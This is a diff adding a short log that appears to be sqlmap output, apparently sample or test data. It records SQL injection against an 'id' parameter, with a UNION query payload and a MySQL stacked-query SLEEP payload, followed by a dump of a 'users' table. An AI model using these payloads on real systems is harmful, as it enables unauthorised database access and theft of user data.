@@ -1,0 +1,17 @@
+[*] starting at 10:00:00
+
+Parameter: id (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-1 UNION ALL SELECT NULL,CONCAT(0x716a6a7071,0x...),NULL-- -
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries
+    Payload: id=1; SELECT SLEEP(5)
+
+back-end DBMS: MySQL >= 5.0.12
+
+[10:00:30] [INFO] table 'testdb.users' dumped to CSV file
+[10:00:30] [INFO] 15 entries dumped
+
+[*] shutting down at 10:00:31
